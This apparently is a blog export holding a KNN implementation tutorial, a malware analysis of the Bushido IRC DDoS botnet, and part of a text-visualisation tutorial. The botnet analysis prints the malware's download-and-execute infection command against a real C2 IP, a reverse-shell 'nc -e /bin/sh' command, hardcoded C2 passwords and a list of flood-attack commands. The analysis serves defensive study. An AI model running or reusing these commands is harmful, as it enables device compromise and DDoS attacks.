use the nearest data point in a different way to so their respective problem. If it’s the classification problem then we take the class that occurs the most in the K data points. And if it’s the regression problem then we take the average of the values of the K data points. There are also other variants of the KNN which is called weighted KNN which we take weight average of the K data points for both classification and regression problem. K in KNN is the positive natural number i.e. K &gt; 1, its the number of neighboring data points to consider when deciding the result. It’s a critical component of the algorithm which we will see how to choose. When I say nearest data point, how do I calculate the distance between points, it’s an interesting question. Well, it’s very simple to calculate the distance between two points in one dimension like the distance between 5 and 12 by simple subtraction it’s 7 but in higher dimension we use Euclidean distance to measure the distance between two points, there are other approaches as well like man-hantten distance, cosine distance, and hamming distance. The goal here is to find similarity in data points, finding similarity in higher dimension is a challenge in itself as we progress with the post we will see why. Calculating distance between data pointsWe first need to calculate the distance between two data point for any given dimension, once we have that function we will use of calculating the distance between test data points to every other data point in the training set. As we are using Euclidean distance, it can be defined as the square root of the square of the difference between two points. Below is the mathematical formula for calculating the distance between two points. $$dist = \\sqrt{(x_1-y_1)^2 + (x_2-y_2)^2 + … + (x_n-y_n)^2}$$$$dist = \\sqrt{\\sum_{i=1}^n (x_i-y_i)^2}$$ Python implementation for the above equation is as below 123456789def euclidean_distance(data_point1, data_point2): ''' returns the distance between data_point1 and data_point2''' if len(data_point1) != len(data_point2) : raise ValueError('feature length not matching') else: distance = 0 for x in range(len(data_point1)): distance += pow((data_point1[x] - data_point2[x]), 2) return math.sqrt(distance) Now that we can calculate distance between two data point we are now interested in finding K nearest neighbouring data points, for that we first find the distance between one point and every other point and sort the distance in ascending order and take the first K points, those will be the data point we are interested to be used to calculate our next result. 123456789101112def get_neighbors(train_set_data_points, test_feature_data_point, k): ''' returns the index the index of K nearest neighbour''' distances = [] length = len(test_feature_data_point)-1 for index in range(len(train_set_data_points)): dist = euclidean_distance(test_feature_data_point, train_set_data_points[index]) distances.append((train_set_data_points[index], dist, index)) distances.sort(key=operator.itemgetter(1)) neighbors = [] for index in range(k): neighbors.append(distances[index][2]) return neighbors let try to test the above function with some data points and see if it’s doing its job right. 1234&gt;&gt;&gt; euclidean_distance([1,2],[2,3])&gt;&gt;&gt; 1.4142135623730951&gt;&gt;&gt; get_neighbors([[1,2],[2,3],[4,5]],[2,3],2)&gt;&gt;&gt; [1, 0] Since these are the common methods that can be used with both version of KNN classification and regression it would be nice to put in KnnBase class then this class can be inherited by KnnRegression class which implements KNN regression algorithm and KnnClassifier which implements KNN classification algorithm. API will be a sklearn style which has parameter initialization in class constructor and class has fit and predict method. If you are following along you can just copy-paste the code if you are feeling lazy to type it. 12345678910111213141516171819202122232425262728293031import mathimport operatorclass KnnBase(object): def __init__(self, k, weights=None): self.k = k self.weights = weights def euclidean_distance(self, data_point1, data_point2): if len(data_point1) != len(data_point2) : raise ValueError('feature length not matching') else: distance = 0 for x in range(len(data_point1)): distance += pow((data_point1[x] - data_point2[x]), 2) return math.sqrt(distance) def fit(self, train_feature, train_label): self.train_feature = train_feature self.train_label = train_label def get_neighbors(self, train_set_data_points, test_feature_data_point, k): distances = [] length = len(test_feature_data_point)-1 for index in range(len(train_set_data_points)): dist = self.euclidean_distance(test_feature_data_point, train_set_data_points[index]) distances.append((train_set_data_points[index], dist, index)) distances.sort(key=operator.itemgetter(1)) neighbors = [] for index in range(k): neighbors.append(distances[index][2]) return neighbors Implementing KNN classifierPredicting the outcome of the KNN classification algorithm is different than that of regression. For classification problem, we take votes of K closest neighbor and the class that has highest votes wins. 1234567891011121314151617class KnnClassifier(KnnBase): def predict(self, test_feature_data_point): # get the index of all nearest neighbouring data points nearest_data_point_index = self.get_neighbors(self.train_feature, test_feature_data_point, self.k) vote_counter = {} # to count votes for each class initialise all class with zero votes print('Nearest Data point index ', nearest_data_point_index) for label in set(self.train_label): vote_counter[label] = 0 # add count to class that are present in the nearest neighbors data points for class_index in nearest_data_point_index: closest_lable = self.train_label[class_index] vote_counter[closest_lable] += 1 print('Nearest data point count', vote_counter) # return the class that has most votes return max(vote_counter.items(), key = operator.itemgetter(1))[0] Implementing KNN RegressionFor regression setting, we just take the average of the output of the K closet training data points. $$output = {1 \\over K}{\\sum_{i=1}^n (y_i)}$$ 12345678910class KnnRegression(KnnBase): def predict(self, test_feature_data_point): nearest_data_point_index = self.get_neighbors(self.train_feature, test_feature_data_point, self.k) total_val = 0.0 # calculate the sum of all the label values for index in nearest_data_point_index: total_val += self.train_label[index] return total_val/self.k Optimized the computation (KNN vectorized version)Above implementation which we saw using python array is very memory hungry and very slow which will be obvious when you run this algorithm on large dataset. To mitigate that we can vectorize the array operations using numpy library which can do vector computation much faster. 123456def get_neighbors_v(train_set, test_set, k): ''' return k closet neighbour of test_set in training set''' # calculate euclidean distance euc_distance = np.sqrt(np.sum((train_set - test_set)**2 , axis=1)) # return the index of nearest neighbour return np.argsort(euc_distance)[0:k] to compare the performance of both the function we will use ipython’s %timeit magic function and run the function for 10000 time and compare the results. So fire a ipython console and type the following code: 1234567In [1]: from sklearn import datasetsIn [2]: iris = datasets.load_iris()In [3]: X = iris.dataIn [4]: %timeit -n 10000 get_neighbors_v(X,X[0],10)17.3 µs ± 232 ns per loop (mean ± std. dev. of 7 runs, 10000 loops each)In [5]: %timeit -n 10000 get_neighbors(X, X[0],10)674 µs ± 70.3 µs per loop (mean ± std. dev. of 7 runs, 10000 loops each) as you can see the result are 40x faster. Crude implementation using python’s native array takes 674µs to execute while vectorized version takes 17.3µs to execute 10000 function calls. You can replace the get_neighbour function code with the vectorized version in the KnnBase class to take advantage of vectorized version of the code. Evaluate the performance of the KNNEvaluation the performance of the model is a topic in itself and entire books are written on the topic so I will try to keep it simple. Algorithm evaluation is how good our model performers based on certain metrics which will discuss, evaluation techniques are different for classification and regression model. For regression model there are various metrics that can be used, one such metrics is Root mean square error (RMSE) which is the measure of the standard deviation from the ground truth which is a scale dependent. If we want something scale independent then we can use Mean absolute percentage error(MAPE) it expresses the accuracy in percentage. A small RMSE/MAPE means a good model and large means, bad model. Below is the code for calculating for both RMSE and MAPE metrics. 12345678910111213def get_rmse(y, y_pred): '''Root Mean Square Error https://en.wikipedia.org/wiki/Root-mean-square_deviation ''' mse = np.mean((y - y_pred)**2) return np.sqrt(mse)def get_mape(y, y_pred): '''Mean Absolute Percent Error https://en.wikipedia.org/wiki/Mean_absolute_percentage_error ''' perc_err = (100*(y - y_pred))/y return np.mean(abs(perc_err)) For KNN classification settings usually we use metrics like precision, recall, and f1 score but for sake of simplicity, we will measure the percentage of data that is correctly classified so if only 10% of the data is correctly classified we say that the model is 10% accuracy. A larger value is better. Below is the implementation. 123def get_accuracy(y, y_pred): cnt = (y == y_pred).sum() return round(cnt/len(y), 2) Data pre-processingOne problem one might run into using KNN is that the feature vector might be on different scale, for example, you have a features like height, weight, and daily expense, height is on inch scale whose value ranging from 2 to 100 , weight is on kg scale whose value might range in 10 to 200 and daily expense is on dollar that might range from 0 to million who knows.A feature that has large scale can influence the decision of the algorithm even though the feature itself in is not actually contributing anything to the output. To tackle this problem we can bring each feature on same scale by either scale the feature in the 0 to 1 range using Normalization or use Standardization method that transforms the feature such that it has mean 0 and standard deviation 1 but to using standardization the assumption is that the feature follows normal distribution so use standardization only if the feature satisfies the assumption. For feature normalization, we will use sklearn MinMaxScale class. Choosing optimal K for KNNTo get high performance for the model it is important to choosing the optimal value of K. So K is the tuning parameter for KNN algorithm. Since we know how to assess the performance from the above section we can plot the value of K vs the evaluation metrics and choose the K which gives maximum performance. Below is the code to do so.For this example we will use iris data set which is a classification problem to try the concept : 12345678910111213141516171819202122232425262728import numpy as npimport matplotlib.pyplot as pltfrom sklearn import datasetsfrom sklearn.preprocessing import MinMaxScalerfrom knn import KnnClassifier, get_accuracy# load the iris data setiris = datasets.load_iris()knn_iris_acc = []X = iris.datay = iris.targetscale = MinMaxScaler()X = scale.fit_transform(X)for k in range(2, len(iris.data)): clf = KnnClassifier(k) clf.fit(X, y) iris_pred = [] for x in X: pred = clf.predict(x) iris_pred.append(pred) iris_target_pred = np.array(iris_pred) knn_iris_acc.append(get_accuracy(iris_target_pred, iris.target))plt.plot(range(2,len(iris.data)), knn_iris_acc)plt.xlabel('Number of neighbours')plt.ylabel('Accuracy')plt.grid()plt.show() If you see the plot performance varies for different values of K, for K=2 we only consider nearest 2 data point and for K=len(iris.data)(all the data point) which is the average prediction for all data point performance varies and max value is 98% for K=13, performance decline as K increases and there is sharp decline after K=100 and 140 and its lowest for K=len(iris.data) which is 55%. We can use this same technique for regression class of problem by plotting. Bias vs Variance trade-offAs we saw the of the value of K has a drastic effect on the performance of the algorithm. For K=1 the decision boundary is highly flexible since the value of the nearest data point is directly applied so for this setting algorithm has low bias and high variance but as the value of K increases decision boundary becomes more and more inflexible i.e close to linear and this is close to high bias and low variance. Ideally, we want to have both bias and variance to be low but it can’t be so we are looking for a trade-off that in our iris data set was achieved for K=13 where we get optimal performance. Advantages If you are using linear regression or other statistical learning methods than those algorithms have some assumption on the data set like they should be normally distributed or error should be uncorrelated etc. but for KNN there is no such assumption made about the data. For KNN there are is only one parameter to tune i.e K, unlike regression where if you have N feature then there might be at least N parameters to tune. Disadvantages Machine learning algorithms that work in low dimension might fail to produce the same result for high-dimensional setting especially similarity base algorithm like KNN. A good intuition behind this is very well explained by Pedro Domingos in one of his research paper which is as follows : our intuitions, which come from a three-dimensional world, often do not apply in high-dimensionalones. In high dimensions, most of the mass of a multivariate Gaussian distribution is not near the mean, but in an increasingly distant “shell” around it; and most of the volume of a high-dimensional orange is in the skin, not the pulp. If a constant number of examples is distributed uniformly ina high-dimensional hypercube, beyond some dimensionality most examples are closer to a face of the hypercube than to their nearest neighbor. Pedro DomingosA Few Useful Things to Know about Machine Learning Another disadvantage of the algorithm is it only uses data points around the predicting points to make a decision and rest other data point are useless. ConclusionWe saw how we implemented the algorithm in python and also looked on how we could get maximum performance by choosing optimal value of K. We haven’t looked into everything related to KNN as there are family of algorithms that are based on KNN which fix the drawback we just discussed like weighted KNN which instead of just taking values on 0/1 from nearest neighbour it takes weighted average of the data points.","link":"/2017/09/25/implementing-knn-from-scratch-in-python/"},{"title":"Reversing Bushido IOT botnet by ZullSec","text":"Yet another Linux Botnet sample by the name of Bushido by a group called 0ffsecurity, but this time things are little interesting, the bad actor is not just interested in using compromised IOT device as DOS attack surface but also using compromised web servers. In this post, we will examine how a small infection shell script which leads to the unravelling of dozens of malware. Solving this case also uncovered the hacker group behind this malware. Let’s get right onto it, the infection script basically downloaded the bunch of Linux binaries from the malicious server and runs it, these binaries are compiled for different platforms as you can see below. In this post we will reverse only 64-bit ELF binary as the rest of the binary will have the same functionality. Malware samplesThese are all the samples which were discovered during the analysis. FILE HASH VALUE FILE NAME FUNCTION 4c1ff6424e1d47921a9c3822c67b6d288e67781d22ee1bc4f82fc11509bfb479 a09rndgxtx botnet binary 40a9be5a72284a14939271e244a9904142c7e87e64d2b1a476b51d36c5f2de26 a88hfdje8 botnet binary f4bed53e2a0d273f00e82825607164ad20caa5f1a02e48e4b5627a819f49df8b ab89484bdhd botnet binary d12ffbef4d85806d77294377956c4ecc48ac9b8c3bddbf26a917723f80c719fb adjde99vhc botnet binary c1b12ad1eb4e64896a66dc9b4e83f0e3a7d2d4c79819b68853f0f64fd329ac83 adjs8993bd botnet binary 37ac5b9aef6955a7a393d87ee656656851c313896fdeaff3b591e68ebda7a21d agf63683gd botnet binary 5a8a8ea38ac8202373474e5ce535efd2302543a5aa595aa00bd3b553467ffd34 alfkdcj9e8 botnet binary fd171c6b8f870bf64885cb05a5f1da3581537810652a9714a592c21889722198 alo99edgwu botnet binary 9bad4e105c1701c965fd65118a14e06d222ca13eb9adb3c9e1e4fd7a80374087 apr98dgs5c botnet binary ca5bb4a794663f35c1ded854e5157e8d077624501514ecac329be7ada8e0248c aqerd783nd botnet binary 7c492dde22c828fffc3067ef6aaa5d466cab76858079ce57492ce9bbfd7e449a atyur7837s botnet binary 5fb8b5590b4845b31988f636a5a09b02bdbb3e730dd1f78d8f04a02013cb760d ambvjcv9e0 botnet binary 70d7adcd931eb49ede937b64f1653a6710fbcea891e2ab186165cff1d3429945 8UsA1.sh infection script 36f38298c5345abf9f0036890b357610078327a4a0a0e61db79fe7afb591830d update.sh infection script eabee288c9605b29f75cd23204b643cfe4d175851b7d57c3d3d73703bd0f8ec8 ftp1.sh download the malware samples via ftp and install it 2544f0299a5795bf12494e2cbe09701cb024b06a0b924c91de0d35efb955a5fe pma.php php botnet more on it in later section 18d6a4280adf67e2adf7a89aa11faa93a5ed6fc9d64b31063386d762b92b45d3 pma.pl pearl botnet more on it in later section Basic Static AnalysisLet see the file information of the binary. 12$ file ambvjcv9e0ambvjcv9e0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped Let’s check the file headers 123456789101112131415161718192021readelf -h x64_ambvjcv9e0ELF Header: Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 Class: ELF64 Data: 2s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: Advanced Micro Devices X86-64 Version: 0x1 Entry point address: 0x400194 Start of program headers: 64 (bytes into file) Start of section headers: 120288 (bytes into file) Flags: 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 3 Size of section headers: 64 (bytes) Number of section headers: 15 Section header string table index: 12 Now the program Headers 1234567891011121314151617181920$ readelf -l ambvjcv9e0Elf file type is EXEC (Executable file)Entry point 0x400194There are 3 program headers, starting at offset 64Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x000000000001b50c 0x000000000001b50c R E 0x100000 LOAD 0x000000000001b510 0x000000000051b510 0x000000000051b510 0x0000000000001418 0x00000000000094a0 RW 0x100000 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x8 Section to Segment mapping: Segment Sections... 00 .init .text .fini .rodata .eh_frame 01 .ctors .dtors .jcr .data .bss 02 Nothing unusual as there is no dynamic section INTERP section and dynamic section is missing. Now lets check section headers 123456789101112131415161718192021222324252627282930313233343536$ readelf -S ambvjcv9e0There are 15 section headers, starting at offset 0x1d5e0:Section Headers: [Nr] Name Type Address Offset Size EntSize Flags Link Info Align [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .init PROGBITS 00000000004000e8 000000e8 0000000000000013 0000000000000000 AX 0 0 1 [ 2] .text PROGBITS 0000000000400100 00000100 0000000000015138 0000000000000000 AX 0 0 16 [ 3] .fini PROGBITS 0000000000415238 00015238 000000000000000e 0000000000000000 AX 0 0 1 [ 4] .rodata PROGBITS 0000000000415260 00015260 00000000000062a6 0000000000000000 A 0 0 32 [ 5] .eh_frame PROGBITS 000000000041b508 0001b508 0000000000000004 0000000000000000 A 0 0 4 [ 6] .ctors PROGBITS 000000000051b510 0001b510 0000000000000010 0000000000000000 WA 0 0 8 [ 7] .dtors PROGBITS 000000000051b520 0001b520 0000000000000010 0000000000000000 WA 0 0 8 [ 8] .jcr PROGBITS 000000000051b530 0001b530 0000000000000008 0000000000000000 WA 0 0 8 [ 9] .data PROGBITS 000000000051b540 0001b540 00000000000013e8 0000000000000000 WA 0 0 32 [10] .bss NOBITS 000000000051c940 0001c928 0000000000008070 0000000000000000 WA 0 0 32 [11] .comment PROGBITS 0000000000000000 0001c928 0000000000000c4e 0000000000000000 0 0 1 [12] .shstrtab STRTAB 0000000000000000 0001d576 0000000000000066 0000000000000000 0 0 1 [13] .symtab SYMTAB 0000000000000000 0001d9a0 0000000000005418 0000000000000018 14 290 8 [14] .strtab STRTAB 0000000000000000 00022db8 00000000000029a2 0000000000000000 0 0 1 The binary is not stripped and it’s self-contained as it is statically linked. Since the binary is not stripped there will be lots of debugging information, with readelf we can list all the symbols as shown below 1234567891011121314151617181920212223242526$ readelf -s ambvjcv9e0318: 000000000040bc46 485 FUNC GLOBAL DEFAULT 2 popen319: 0000000000407ca5 177 FUNC GLOBAL DEFAULT 2 botkill320: 0000000000411484 351 FUNC GLOBAL DEFAULT 2 sysconf322: 000000000040b7d8 15 FUNC GLOBAL DEFAULT 2 vsprintf323: 0000000000410ab4 72 FUNC GLOBAL DEFAULT 2 random324: 0000000000411ad0 19 FUNC GLOBAL HIDDEN 2 __GI_getpagesize325: 000000000040dd60 54 FUNC GLOBAL HIDDEN 2 __GI_strdup326: 000000000040b43c 35 FUNC GLOBAL DEFAULT 2 getdtablesize328: 0000000000405c17 33 FUNC GLOBAL DEFAULT 2 contains_fail329: 000000000040037f 286 FUNC GLOBAL DEFAULT 2 Send330: 0000000000414c50 19 FUNC GLOBAL HIDDEN 2 __length_question332: 000000000040877a 1608 FUNC GLOBAL DEFAULT 2 hackpkg333: 00000000004130c4 115 FUNC GLOBAL DEFAULT 2 setservent334: 000000000040dce8 48 FUNC GLOBAL HIDDEN 2 __GI_strcasecmp335: 0000000000411cd0 30 FUNC GLOBAL HIDDEN 2 __GI_tolower336: 000000000040d3a8 192 FUNC GLOBAL DEFAULT 2 putc_unlocked337: 000000000040fad4 11 FUNC WEAK DEFAULT 2 recv338: 000000000040fa48 43 FUNC WEAK DEFAULT 2 connect339: 0000000000414c00 80 FUNC GLOBAL HIDDEN 2 __encode_question340: 00000000004115e4 70 FUNC GLOBAL HIDDEN 2 __GI___uClibc_fini342: 0000000000414ab8 163 FUNC GLOBAL HIDDEN 2 __encode_header343: 0000000000413234 233 FUNC GLOBAL DEFAULT 2 getservbyname_r344: 0000000000414a40 119 FUNC GLOBAL HIDDEN 2 __GI_strncat345: 000000000041162a 3 FUNC WEAK DEFAULT 2 __pthread_mutex_lock346: 000000000040fc98 30 FUNC GLOBAL DEFAULT 2 __sigdelset Since there were lots of symbols so as not to lengthen the post I have included only a small part of the section. Now let’s see all the symbols ending with “.c” that will give us an idea by the name program of the file. 12345678910111213141516$ readelf -s x64_ambvjcv9e0 | grep -F .c16: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c26: 0000000000000000 0 FILE LOCAL DEFAULT ABS crtstuff.c32: 0000000000000000 0 FILE LOCAL DEFAULT ABS initfini.c35: 0000000000000000 0 FILE LOCAL DEFAULT ABS Bushido-IRC.c50: 0000000000000000 0 FILE LOCAL DEFAULT ABS __syscall_fcntl.c51: 0000000000000000 0 FILE LOCAL DEFAULT ABS _exit.c52: 0000000000000000 0 FILE LOCAL DEFAULT ABS close.c53: 0000000000000000 0 FILE LOCAL DEFAULT ABS fork.c54: 0000000000000000 0 FILE LOCAL DEFAULT ABS getdtablesize.c55: 0000000000000000 0 FILE LOCAL DEFAULT ABS getpid.c56: 0000000000000000 0 FILE LOCAL DEFAULT ABS getppid.c57: 0000000000000000 0 FILE LOCAL DEFAULT ABS getrlimit.c58: 0000000000000000 0 FILE LOCAL DEFAULT ABS ioctl.c59: 0000000000000000 0 FILE LOCAL DEFAULT ABS kill.c60: 0000000000000000 0 FILE LOCAL DEFAULT ABS mkdir.c Bushido-IRC.c interesting !. Next stings, this was the most interesting part of the analysis, you won’t even have to open the disassembler to understand what the malware does, strings will confess it all to you. 12345678910111213141516$ strings ambvjcv9e0cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://80.93.187.211/update.sh -O update.sh; busybox wget http://80.93.187.211/update.sh -O update.sh; ftpget -v -u anonymous -p anonymous -P 21 80.93.187.211 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 80.93.187.211 update.sh update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.shmirai.*dlr.*mipsmips64mipselsh2ebsh2elfarmv5armv4tlarmv4armv6i686powerpc There were lots of strings, just by skimming through the strings you can make out the functionality of malware. But here is the summary of the interesting strings you will find: CNC server IP username and password used to brute force telnet service HTTP headers Browser user agent strings lots of racist comment and foul words. lots of IRC commands and strings malware usage help strings malware update bash command and other shell commands error handling message libc function names nmap scan commands and logging of the error. build file names looking at the string you can make a reasonable judgment of what their malware does. But to Investigate the execution flow and how to malware connect to CNC we should dig further. Since we found the IP in the strings, we can do a simple port scan of the CNC server, this is where I found the malicious pearl and PHP code, more on it in the next section. Investigating the ServerOnce you see IP address inside binary its a natural instinct to do a simple port scan on the IP, so innocent nmap scan on the server and got the following results. Server A (IP 80.93.187.211): this server was serving the malware 12345678910111213141516171819202122232425262721/tcp open ftp 22/tcp open ssh OpenSSH 5.3 (protocol 2.0)| ssh-hostkey:| 1024 b3:ae:e9:79:22:65:37:15:13:66:c8:8f:0a:81:13:ec (DSA)|_ 2048 32:e9:e2:9f:9b:ae:13:e6:99:7a:60:91:9c:38:30:8d (RSA)80/tcp open http Apache httpd 2.2.15 ((CentOS))| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Apache/2.2.15 (CentOS)|_http-title: Apache HTTP Server Test Page powered by CentOS135/tcp filtered msrpc139/tcp filtered netbios-ssn443/tcp open https?445/tcp filtered microsoft-ds3306/tcp open mysql MySQL (unauthorized)6667/tcp open irc UnrealIRCd| irc-info:| users: 57| servers: 1| chans: 3| lusers: 57| lservers: 0| server: irc.NulL| version: Unreal3.2.10.6. irc.NulL| source ident: nmap| source host: 19A967F7.1F3B5440.6D396E3B.IP|_ error: Closing Link: kksqfgqca[114.143.107.254] (Client has disconnected from ZullSec) From the scan results couple of deductions that we can make are : It is an IRC based CNC server(plus we found IRC command in the strings this confirms that assumption). FTP is probability serving files: to investigating further I connected to the FTP with default credentials anonymous as username and password to gain access and it worked! Once you would have connected to that server you would have found the binaries which we saw earlier, wandering a little bit here and there you would have also stumble upon other file pma.php, pma.el(more on this in Malware functionality section) and other shell scripts which basically downloaded the binaries and runs it. There was another update file called 8UsA1.sh which as also doing the same but was connecting to a different IP address 185.244.25.217. Server B (IP 185.244.25.217) - this server was found in 8UsA1.sh, so let’s do another innocent nmap port scan. Found nothing interesting on this server simple HTTP service, results were as shown below. 123480/tcp open http443/tcp open httpsRunning: Linux 2.6.XOS details: Linux 2.6.18 - 2.6.22 CNC ServerFrom our earlier finding its reasonable assumption that this malware is an IRC botnet hosted on Server A. If you try to connect to the server using any IRC client you will find two channel on that IRC Server : #pma - this is the channel where infected web server malware PHP/pearl script joins. Since PHP/pearl code was not obfuscated it was very simple to read it. #zull - this channel is where the Linux binary malware joins the channel and waits for the command. IRC serverOnce the malware is running it connect to IRC server with the following command NICK[ZULL|x86_64]ZM5z format of the command is NICK[|] malware joins the channel #zull using a password which is hardcoded in the binary which can be seen in below disassembly. Malware functionalitySince binary has the debugging symbols not stripped, you could read the disassembly code effortlessly. Based on that you can make the following claims: DDOS attack it main functionality of the malware. There were many types of DDOS attacks like ICMP flood, TCP, UDP based attacks. Malware Client can be enabled/disabled by the CNC(not sure why ?). Disabling is done by a password which is “FreakIsYourGod!!!”, the password can be found in the binary. Malware client can be updated fetching the updated binaries from the server, there is another update mechanism by which malware can download the source code and compile the binary and delete the source code. malware client can download, compile C files and deletes the source code. This feature was present in the same function as the previous feature but could be a switch to different execution flow by one variable. malware joins the #zull channel with password topkeka. It can hop to a different server when instructed by current CNC. Digging further you will find an array of structure where the first field is a pointer to a string( which is the name of the functionality) and next field is a pointer to a function which is the execution of that functionality. So far we understood that bad actor compromises IOT devices or web server and use them as the attack surface for DDOS. The command to the infected devices is given through IRC channels. The bad actor uses channel #zull to command the IoT devices and #pma to the command we servers. IOT devices are infected with binaries and the servers are infected with PHP or pearl script. Functionalities of both the malware are described in more detail in the next section. Linux binaries functionality Non-root/non-spoof DDoS commands commands : STD : A non spoof HIV STD flooder HOLD : A vanilla TCP connect flooder JUNK : A vanilla TCP flooder (modded) UNKNOWN &lt;port, 0 for random&gt; &lt;packet size, 0 for random&gt; : An advanced non spoof UDP flooder modified by Freak HTTP : An extremely powerful HTTP flooder Spoof/root commands : UDP : A UDP flooder PAN : An advanced syn flooder that will kill most network drivers TCP : An advanced TCP flooder with multithreading. Will kill almost any service. PHATWONK &lt;flags/method&gt; : A leet flooder coded by Freak, attacks 31 ports. Can set flags or attack method. BLACKNURSE : An ICMP packet flooder that will crash most firewalls and use loads of CPU. Other commands : RNDNICK : Randomizes the knights nick NICK : Changes the nick of the client SERVER : Changes servers GETSPOOFS : Gets the current spoofing SPOOFS : Changes spoofing to a subnet DISABLE : Disables all packeting from this client ENABLE : Enables all packeting from this client KILL : Kills the knight DNS2IP GET : Downloads a file off the web and saves it onto the hd UPDATE src:bin : Update this bot HACKPKG : HackPkg is here! Install a bin, using http, no depends! VERSION : Requests version of client KILLALL : Kills all current packeting HELP : Displays this IRC : Sends this command to the server SH : Executes a command ISH : SH, interactive, sends to channel SHD : Executes a psuedo-daemonized command GETBB : Get a proper busybox INSTALL &lt;http server/file_name&gt; : Download &amp; install a binary to /var/bin BASH : Execute commands using bash. BINUPDATE http:server/package : Update a binary in /var/bin via wget SCAN : Call the nmap wrapper script and scan with your opts. RSHELL : Equates to nohup nc ip port -e /bin/sh LOCKUP http:server : Kill telnet, d/l aes backdoor from , run that instead. GETSSH http:server/dropbearmulti : D/l, install, configure and start dropbear on port 30022. Web Server botnet functionality (php and pearl script) mail [to] [from] [subject] [message] dns [host] rndnick raw [irc] [data] uname eval [php] [code] exec [command] [args] cmd [command] [args] udpflood [ip] [port] [time] [packet] [size] tcpconn [host] [port] [time] slowread [host] [port] [page] [sockets] [time] slowloris [host] [time] l7 method [host] [time] post [host] time head [host] [time] tcpflood [host] [port] [time] httpflood [host] [port] [time] [method] [url] proxyhttpflood [targetUrl(with http://)] [proxyListUrl] [time] [method] cloudflareflood [host] [port] [time] [method] [url] [postFields] ud.server [host] [port] [pass] [chan] this functionality resembles the earlier functionality which we saw in binary function. The Bad ActorsOnce you are connected to the IRC server you will have seen the following information on the channel. I tried to search for these name which we see in above image on twitter and these are the accounts I found on twitter : m4licious M1r0x I couldn’t find other accounts, these people belong to a group called 0ffsecurity. My guess is they are trying to sell this botnet as a service. As doing a little google search you will find the following accounts. These are the account for the Botnet product: Twitter Facebook youtube demo video ConclusionThis malware is not new in this space and I am quite sure that these people have borrowed lots of code from the Mirai and made it into a new DDOS tool. They are also using the compromised web server as a DDOS attacking agent, and they are using IRC server as common CNC server to control both infected web server and IOT device.","link":"/2018/09/02/reversing-bushido-iot-botnet-by-zullsec/"},{"title":"Visual text Analytics with python","text":"Due to the flourish of internet and accessibility of technology incredible platforms like social media, forums, etc have been created for knowledge sharing. Exchanging ideas is not confined to a geographical area. Due to this volume and variety of content is generated in the form of images, video, text, etc. The amount of information is so much that it’s unmanageable to perceive it in bounded time, in such times area of text analytics has got the attention of people in the field of linguistics, business, etc. The goal of the post is to summarize few of the visual text analytical techniques that could help you in your initial phase of text mining or help you create a new feature for creating machine learning model. I will describe few online and offline tools that you could use to help you get started. By offline tools, I mean using python based software packages to created visualization and text pre-processing. Online tools will be web-browser based applications to which just have to paste the text or upload the text file to visualise the results. Visual Text AnalyticsExploratory text analysis can help us to get the gist of the text data. I am going to use python for the code example and for text processing. For text processing and text corpus I will be using nltk package and for visualization matplotlib package. There are also other packages that we will use as we progress. WordCloud: one of the simplest visualization technique which is a type of word frequency visualization. The size of the word in the image is bigger for more frequent word and smaller for less frequent word. This type of visualization can be of help in initial query formation. There are some drawbacks like the longer word may occupy more space giving the impression of the frequent word than it actually is. It may not help us to compare two frequent words about their relationship can be misleading sometimes even if using two words together may make sense. Frequent words may not be meaningful. For generating word cloud I am going to use wordcloud package you can install the package from pip. Below is the code to generate cloud. Text dataset used is the US presidential inaugural addresses which are part of nltk.corpus package. 12345678910# import the datasetfrom nltk.corpus import inaugural# extract the datataset in raw format, you can also extract it in other formats as welltext = inaugural.raw()wordcloud = WordCloud(max_font_size=60).generate(text)plt.figure(figsize=(16,12))# plot wordcloud in matplotlibplt.imshow(wordcloud, interpolation=&quot;bilinear&quot;)plt.axis(&quot;off&quot;)plt.show() Lexical dispersion plot: this is the plot of a word vs the offset of the word in the text corpus.The y-axis represents the word. Each word has a strip representing entire text in terms of offset, and a mark on the strip indicates the occurrence of the word at that offset, a strip is an x-axis. The positional information can indicate the focus of discussion in the text. So if you observe the plot below the words America, democracy and freedom occur more often at the end of the speeches and words like duties and some words have somewhat uniform distribution in the middle. This way we can conclude that as the speech started the focus was on duties but then focus shifted to America, democracy and freedom. Below is the code to reproduce the plot. 1234from nltk.book import text4 as inaugural_speechesplt.figure(figsize=(16,5))topics = ['citizens', 'democracy', 'freedom', 'duties', 'America','principle','people', 'Government']inaugural_speeches.dispersion_plot(topics) Frequency distribution plot: this plot tries to communicate the frequency of the vocabulary in the text. Frequency distribution plot is word vs the frequency of the word. The frequency of the word can help us understand the topic of the corpus. Different genre of text can have a different set of frequent words, for example, If we have news corpus then sports news may have a different set of frequent words as compared to news related to politics, nltk has FreqDist class that helps to create a frequency distribution of the text corpus. The code below will find 5 most and least frequent words. 1234567891011from nltk.corpus import browntopics = ['government', 'news', 'religion','adventure','hobbies']for topic in topics: # filter out stopwords and punctuation mark and only create array of words words = [word for word in brown.words(categories=topic) if word.lower() not in stop_words and word.isalpha() ] freqdist = nltk.FreqDist(words) # print 5 most frequent words print(topic,'more :', ' , '.join([ word.lower() for word, count in freqdist.most_common(5)])) # print 5 least frequent words print(topic,'less :', ' , '.join([ word.lower() for word, count in freqdist.most_common()[-5:]])) output for above code is presented in the table format below. It will be surprising to see that in least frequent table words belonging to a category of text corpus are more informative compared to the words found in the most frequent table which is the core idea behind TF-IDF algorithm. Most frequent words convey little information about text compared to less frequent words. Most 5 Frequently occurring words government news religion adventure hobbies year said god said one states would world would may united one one man time may last may back two would two new one first Least 5 Frequently occurring words government news religion adventure hobbies wage macphail habitable sprinted majestic irregular descendants reckless rug draft truest jointly mission thundered gourmets designers amending descendants meek fastenings qualities plaza suppose jointly fears The 